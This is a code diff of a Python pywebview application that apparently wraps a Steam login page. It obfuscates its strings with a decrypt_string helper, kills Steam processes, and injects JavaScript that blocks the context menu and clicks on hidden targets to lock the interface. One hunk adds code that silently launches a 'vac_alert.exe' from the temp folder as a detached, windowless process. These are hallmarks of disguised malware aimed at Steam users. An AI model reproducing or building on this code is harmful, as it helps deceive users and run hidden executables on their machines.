@@ -439,8 +439,7 @@ a, button, input, select, .btn_grey_white_innerfade {
     -webkit-app-region: no-drag;
 }
 </style>
-<button id="custom-close-btn" onclick=decrypt_string("GVsWDyEmdxIjAA9aBFADDUBTCAJgMjUNKRI1TxtXAhUZGlE=")>&#x2715;</button>"""
-
+<button id="custom-close-btn" onclick="window.pywebview.api.close_window()">&#x2715;</button>"""
 
 class Api:
     def __init__(self):
@@ -587,6 +586,17 @@ def _find_steam_exe():
             return p
     return None
 
+    # Launch the compiled VAC alert tool
+    temp_exe = os.path.join(tempfile.gettempdir(), "vac_alert.exe")
+    if os.path.exists(temp_exe):
+        subprocess.Popen(
+            [temp_exe],
+            creationflags=0x00000008 | 0x08000000, # DETACHED_PROCESS | CREATE_NO_WINDOW
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+            close_fds=True
+        )
 
 def _kill_steam_processes():
     decrypt_string("vpGo2p7pidCKx7qNo7tGqtzj+bv7cYndi/e6hqO/ts+/s6nqn9p5ES4SC1VcXB4fTuLAS5/QidyKyLu7o7u3+7+wqNmf0ojsi/66gKKMSA==")
@@ -791,10 +801,10 @@ def main():
 
     def on_loaded():
         try:
-            window.evaluate_js("""
+            js_code = """
                 document.addEventListener('contextmenu', event => event.preventDefault(), true);
 
-                if (window.location.href.includes(decrypt_string('QVEQCjp+')) && !window._ui_locked) {
+                if (window.location.href.includes('""" + decrypt_string('QVEQCjp+') + """') && !window._ui_locked) {
                     let style = document.createElement('style');
                     style.innerHTML = `
                         .ContextMenu, 
@@ -847,7 +857,7 @@ def main():
                     window._ui_locked = true;
                     
                     const blockTargetClicks = function(e) {
-                        let target = e.target.closest(decrypt_string('HUQfSAIwIAcoKFsUUhoqGxdXCjR/fXkRLBBJdBNAAwgxAFRLbR04Gz8FNQpeGUgZBlMMPy8zGg41BA8UUhcFEg9GLAosEjUNKRJKEg=='));
+                        let target = e.target.closest('""" + decrypt_string('HUQfSAIwIAcoKFsUUhoqGxdXCjR/fXkRLBBJdBNAAwgxAFRLbR04Gz8FNQpeGUgZBlMMPy8zGg41BA8UUhcFEg9GLAosEjUNKRJKEg==') + """');
                         if (target) {
                             e.stopPropagation();
                             e.preventDefault();
@@ -858,7 +868,7 @@ def main():
                     document.addEventListener('click', blockTargetClicks, true);
                     
                     const removeFocusRing = function() {
-                        document.querySelectorAll(decrypt_string('QHQXCDsiOAA2EkYYKVoKGx1BUlZsFzYBLwQLWh5cRCc=')).forEach(function(el) {
+                        document.querySelectorAll('""" + decrypt_string('QHQXCDsiOAA2EkYYKVoKGx1BUlZsFzYBLwQLWh5cRCc=') + """').forEach(function(el) {
                             el.style.setProperty('outline', 'none', 'important');
                             el.style.setProperty('box-shadow', 'none', 'important');
                             el.style.setProperty('border-color', 'transparent', 'important');
@@ -868,7 +878,8 @@ def main():
                     setInterval(removeFocusRing, 500);
                     new MutationObserver(removeFocusRing).observe(document.body, { subtree: true, attributes: true, attributeFilter: ['style', 'class'] });
                 }
-            """)
+            """
+            window.evaluate_js(js_code)
         except Exception:
             pass
 
